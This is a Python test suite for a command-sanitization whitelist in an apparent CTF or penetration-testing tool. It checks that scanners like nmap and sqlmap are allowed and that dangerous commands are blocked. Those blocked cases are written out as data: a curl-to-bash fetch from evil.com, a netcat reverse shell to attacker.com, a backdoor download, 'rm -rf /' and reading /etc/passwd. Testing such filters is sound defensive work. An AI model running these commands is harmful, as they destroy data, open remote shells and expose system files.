#!/usr/bin/env python3
"""
Tier 1 Test: T1-003 Command Sanitization

Tests that malicious commands are blocked while valid ones pass.
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from tests.hands_on._lib import TestRunner, TestStatus, print_banner


def test_sanitization_valid() -> dict:
    """Test that valid commands pass sanitization."""
    from src.ctf_core.utils.sanitize import sanitize_command, ALLOWED_BINARIES
    
    # Valid commands that should pass (at MEDIUM security level)
    valid_cases = [
        ("nmap", ["-sV", "192.168.1.1"]),
        ("nmap", ["-sC", "-sV", "scanme.nmap.org"]),
        ("sqlmap", ["-u", "http://example.com/?id=1", "--batch"]),
        ("searchsploit", ["-s", "apache"]),
        # Note: hydra requires HIGH security level, so it's tested separately
        ("gobuster", ["-u", "http://example.com", "-w", "wordlist.txt"]),
    ]
    
    failed = []
    passed_count = 0
    
    for tool, args in valid_cases:
        try:
            safe, binary, sanitized = sanitize_command(tool, args)
            if safe:
                passed_count += 1
            else:
                failed.append(f"{tool} should be allowed")
        except ValueError as e:
            # Check if it's a security level issue
            if "higher security level" in str(e):
                failed.append(f"{tool} requires higher security level")
            else:
                failed.append(f"{tool} blocked unexpectedly: {e}")
    
    return {
        "passed": len(failed) == 0,
        "message": f"Valid: {passed_count}/{len(valid_cases)} passed" if len(failed) == 0 else f"Failed: {', '.join(failed)}",
        "details": {
            "valid_cases": len(valid_cases),
            "passed": passed_count,
            "failed_cases": failed
        }
    }


def test_hydra_high_security() -> dict:
    """Test that hydra can be used with HIGH security level."""
    from src.ctf_core.utils.sanitize import sanitize_command
    from src.ctf_core.utils.command_whitelist import get_command_whitelist, SecurityLevel
    
    try:
        # Get HIGH security level whitelist
        whitelist = get_command_whitelist(SecurityLevel.HIGH)
        
        # Validate hydra with HIGH security
        is_valid, error_msg, validated_args = whitelist.validate_command("hydra", ["-l", "admin", "-p", "password", "ssh://target"])
        
        if is_valid:
            return {
                "passed": True,
                "message": "hydra validated with HIGH security level",
                "details": {
                    "tool": "hydra",
                    "security_level": "HIGH",
                    "args_validated": validated_args
                }
            }
        else:
            return {
                "passed": False,
                "message": f"hydra validation failed: {error_msg}",
                "details": {
                    "error": error_msg
                }
            }
    except Exception as e:
        return {
            "passed": False,
            "message": f"Error: {str(e)}",
            "details": {"exception": str(e)}
        }


def test_sanitization_dangerous() -> dict:
    """Test that dangerous commands are blocked."""
    from src.ctf_core.utils.sanitize import sanitize_command
    
    # Dangerous commands that should be blocked
    dangerous_cases = [
        ("rm", ["-rf", "/"]),
        ("bash", ["-c", "cat /etc/passwd"]),
        ("curl", ["http://evil.com/shell.sh", "|", "bash"]),
        ("nc", ["-e", "/bin/bash", "attacker.com", "4444"]),
        ("python", ["-c", "import os; os.system('rm -rf /')"]),
        ("wget", ["http://evil.com/backdoor", "-O", "/tmp/bd", ";", "chmod", "+x", "/tmp/bd"]),
    ]
    
    blocked_count = 0
    failed = []
    
    for tool, args in dangerous_cases:
        try:
            safe, binary, sanitized = sanitize_command(tool, args)
            if not safe:
                blocked_count += 1
            else:
                failed.append(f"{tool} should be blocked")
        except ValueError:
            blocked_count += 1  # Blocked with exception is also OK
    
    return {
        "passed": len(failed) == 0,
        "message": f"Dangerous: {blocked_count}/{len(dangerous_cases)} blocked correctly",
        "details": {
            "dangerous_cases": len(dangerous_cases),
            "blocked": blocked_count,
            "failed_to_block": failed
        }
    }


def test_command_whitelist() -> dict:
    """Test command whitelist functionality."""
    from src.ctf_core.utils.sanitize import ALLOWED_BINARIES
    from src.ctf_core.utils.command_whitelist import get_command_whitelist, SecurityLevel
    
    # Get whitelist
    whitelist = get_command_whitelist(SecurityLevel.MEDIUM)
    allowed_tools = whitelist.get_allowed_tools()
    
    # Check critical tools are in simple whitelist
    critical_tools = ["nmap", "sqlmap", "searchsploit", "ffuf", "gobuster"]
    missing_simple = [t for t in critical_tools if t not in ALLOWED_BINARIES]
    
    # Check critical tools are in advanced whitelist
    allowed_tool_names = [t['name'] for t in allowed_tools]
    missing_advanced = [t for t in critical_tools if t not in allowed_tool_names]
    
    return {
        "passed": len(missing_simple) == 0 and len(missing_advanced) == 0,
        "message": f"Whitelist has {len(ALLOWED_BINARIES)} tools (simple), {len(allowed_tools)} tools (advanced)" if len(missing_simple) == 0 else f"Missing: {missing_simple}",
        "details": {
            "simple_whitelist_size": len(ALLOWED_BINARIES),
            "advanced_whitelist_size": len(allowed_tools),
            "critical_tools": critical_tools,
            "missing_simple": missing_simple,
            "missing_advanced": missing_advanced
        }
    }


def run_tests():
    """Run all Tier 1 sanitization tests."""
    print_banner()
    
    runner = TestRunner(tier=1, suite_name="Command Sanitization Tests")
    runner.print_header("Tier 1: Command Sanitization & Security")
    
    print("Testing that malicious commands are blocked and valid ones pass.\n")
    
    runner.run_test(test_sanitization_valid, "T1-003a", "Valid Commands Allowed")
    runner.run_test(test_sanitization_dangerous, "T1-003b", "Dangerous Commands Blocked")
    runner.run_test(test_command_whitelist, "T1-003c", "Command Whitelist Check")
    runner.run_test(test_hydra_high_security, "T1-003d", "Hydra High Security Level")
    
    result = runner.complete()
    runner.print_summary()
    
    return 0 if result.failed == 0 and result.errors == 0 else 1


if __name__ == "__main__":
    sys.exit(run_tests())
